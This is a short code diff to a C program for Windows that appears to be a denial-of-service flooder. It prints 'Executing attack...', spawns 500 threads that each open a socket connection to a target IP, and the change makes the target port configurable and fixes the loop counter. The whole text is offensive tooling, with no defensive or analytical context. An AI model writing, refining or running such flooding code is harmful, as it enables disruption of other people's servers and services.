@@ -13,11 +13,18 @@ void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
 DWORD WINAPI attack(LPVOID target_ip);
 
+struct address{
+    const char* ip;
+    int port;
+};
+
 int main(){
-    const char* target_ip = "";
+    struct address target_addr;
+    target_addr.ip = "";
+    target_addr.port = 80;
     printf("Executing attack...\n");
-    for (int i; i<500; i++){
-        HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)target_ip, 0, NULL);
+    for (int i=0; i<500; i++){
+        HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
         // printf("Thread created");
         if (attack_thread == NULL){
             printf("error creating thread \n");
@@ -30,13 +37,15 @@ int main(){
     return 0;
 }
 
-DWORD WINAPI attack(LPVOID target){
-    const char* target_ip = (const char*) target;
+DWORD WINAPI attack(LPVOID target_addr){
+    struct address target = *(struct address*)target_addr;
+    const char* target_ip = target.ip;
+    int port = target.port;
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(80);
+    serv_addr.sin_port = htons(port);
     startWinsock(&wsaData);
     client_socket = startSocket();
     connectToServer(&serv_addr, client_socket, target_ip);
